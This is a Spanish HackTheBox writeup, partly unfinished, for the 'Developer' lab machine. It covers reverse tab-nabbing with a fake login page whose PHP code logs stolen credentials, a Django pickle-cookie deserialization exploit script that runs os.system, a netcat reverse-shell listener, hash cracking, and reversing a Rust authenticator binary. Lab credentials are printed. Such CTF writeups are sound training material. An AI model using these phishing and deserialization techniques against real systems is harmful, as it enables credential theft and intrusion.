---
title: "Developer"
date: 2025-05-29 16:41:28 +0200
categories: writeups HackTheBox
tags: máquina linux binaryanalysis deserialization django tabnabbing infoleak criptografía pickle criptografía postgreSQL sentry
description: Writeup de la máquina Developer de Hackthebox.
image: ../assets/images/posts/logos/hackthebox.png
---
## Resumen de la resolución

Texto
___
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_trr0r.opvn
```

Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script **whichSystem.py** podremos conocer dicha información.

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140516.png>)

> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.103`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.103 -oG allPorts
```

Observamos como nos reporta que tan solo se encuentran abiertos los puertos **22 y 80**.

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140643.png>)

Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -p22,80 -sCV 10.10.11.103 -oN targeted
```

En el segundo escaneo de **Nmap**, lo que más nos llamará la atención es la existencia del dominio **developer.htb**.

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140659.png>)

___
### Puerto 80 - HTTP (Apache)

**Virtual Hosting** + `/etc/hosts` + `10.10.11.103 developer.htb`

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416140825.png>)

nos registraremos y nos logeará automáticamente

resueltos en **Más allá del Root**

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141148.png>)

En primer lugar, no tenemos otra opción que resolver cualquiera de ellos para habilitar la posibilidad de subir un writeup.  
### Challenge 1: Phised List | Forensic

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141731.png>)

```bash
unzip phished_credentials.xlsx
cat xl/sharedStrings.xml
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416141907.png>)

ahora si que podemos subir un writeup

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416143639.png>)

___
## Explotación
### Tab Nabbing

[Tab Nabbing - Hacktricks](https://book.hacktricks.wiki/es/pentesting-web/reverse-tab-nabbing.html?highlight=tab%20nabbing#descripci%C3%B3n)

```bash
python3 -m http.server 80
```

```html
<!DOCTYPE html>
<html>
<body>
<p>Este es mi writeup</p>
<script>
	window.opener.location = "http://10.10.14.160/TabNabbing";
</script>
</body>
</html>
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416144712.png>)

haciendo uso de wget, nos descargaremos todo estos recursos

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416144428.png>)

```bash
wget -r http://developer.htb/login
```

Ahora, el fichero writeup.html tendrá el siguiente contenido

```html
<!DOCTYPE html>
<html>
<body>
<p>Este es mi writeup</p>
<script>
  window.opener.location = "http://10.10.14.160/accounts/login/";
</script>
</body>
</html>
```

ahora bajo el diretorio accounts/login nos crearemos al ficheor index.html lo llamaremos index.php y le añadiremos el siguiente contenido, simulando la página web de login de la original, a la que será redirigido el usuario que está por detrás revisando los writeups

```php
<?php 

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

  $username = $_POST["login"];
  $password = $_POST["password"];

  file_put_contents("../../passwords.txt", $username . ":" . $password . "\n", FILE_APPEND);
}

?>
```

```bash
php -S 0.0.0.0:80
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183156.png>)

Veremos que recibimos una petición por POST desde la máquina vícitma

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183706.png>)

**admin:SuperSecurePassword@HTB2021**

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183734.png>)

`http://developer.htb/admin/login/`

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416183926.png>)

`http://developer.htb/admin/sites/site/`

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184008.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184621.png>)
### Cookie Pickle Deseralization | Sentry (developer-sentry.developer.htb)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184754.png>)

Crearemos un proyecto y al borrarlo veremos este error

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184826.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416184857.png>)

[RCE on Facebook Server](https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/)

```python
#!/usr/bin/python

import django.core.signing, django.contrib.sessions.serializers
from django.http import HttpResponse
import cPickle
import os

SECRET_KEY='[RETRIEVE-KEY]'
#Initial cookie I had on sentry when trying to reset a password
cookie='.eJxrYKotZNQI5UxMLsksS80vSi9kimBjYGAoTs0rKaosZA5lKS5NyY_gAQoVuqSnZqd5uvoEOFZEcAEFSlKLS5Lz87MzU8FayvOLslNTQoXiE0tLMuJLi1OL4pMSk7NT81JClSDG6ZWWZOYU64Hk9VxzEzNzHIEsJ6gaXiR9mSnerKV6AAegM_E:1u55vW:5n2R2iaWLY-P4tctj0GKpV4Yn9Q'
newContent =  django.core.signing.loads(cookie,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
class PickleRce(object):
    def __reduce__(self):
        return (os.system,("ping -c 1 10.10.14.160",))
newContent['testcookie'] = PickleRce()

print django.core.signing.dumps(newContent,key=SECRET_KEY,serializer=django.contrib.sessions.serializers.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies',compress=True)
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190149.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190203.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190240.png>)

**Reverse Shell** + **NetCat** (`nc -nlvp 443`)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190404.png>)

___
## Movimiento lateral de usuario
### Enumeración local

**Tratamiento de la TTY**

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191614.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190837.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416190903.png>)

### Information Leakage → Cracking Hashes

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191254.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191229.png>)

```bash
hashcat hash /usr/share/wordlists/rockyou.txt -a0
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191629.png>)

```bash
ssh karl@10.10.11.103 # E introducimos la contraseña: 'insaneclownposse'
```

___
## Escalada de privilegios
### Enumeración local

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191731.png>)
**Sudoers**
![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191743.png>)
### /root/.auth/authenticator

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416191928.png>)

**Transferir archivos**

tampoco es vulenrable al bof

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416192147.png>)

```bash
string -n 10 authenticator
```

```
Invalid AES key size./root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/aessafe.rs/root/.cargo/registry/src/github.com-1ecc6299db9ec823/rust-crypto-0.2.36/src/buffer.rs
```

The binary is using AES crypto. It’s also clear it is written in Rust (from the `.rs` extension, as well as many other clues in `strings` output).

ghidra

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416193552.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416203619.png>)

[crypto::aes::ctr rust function](https://docs.rs/rust-crypto/latest/crypto/aes/fn.ctr.html)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416195615.png>)

**KEY**

<kbd>Click Derecho</kbd> + <kbd>Copy Special</kbd> + <kbd>Byte String (No Spaces)</kbd>

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416204449.png>)

lo mismo que antes pero para **IV**

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416204728.png>)

hace dos comparaciones, una que algo sea igual a 32 y después compara dos cadenas

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250416205329.png>)

```bash
gdb ./authenticator -q
```

```
b main
r
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112338.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112426.png>)

```c

b *0x55555555b9ac
c
abc
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112716.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112545.png>)

```c
b *0x55555555b9b9
c
r
c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA // python3 -c 'print("A"*32)'
c
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112906.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417112952.png>)


![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113431.png>)


![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113136.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113524.png>)

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113725.png>)

```bash
ssh -i id_rsa root@10.10.11.103
```

![](<../assets/images/posts/2025-05-29-developer/Pasted image 20250417113745.png>)

___
## Más allá del Root
### Challenge 2: PSE | Forensic

### Challenge 3: Lucky Guess | Reversing
### Challenge 4: Authentication | Reversing
### Challenge 5: RevMe | Reversing
### Challenge 6: PwnMe | Pwn
### Challenge 7: Easy Encryption | Crypto

### Challenge 8: Triple Whammy | Crypto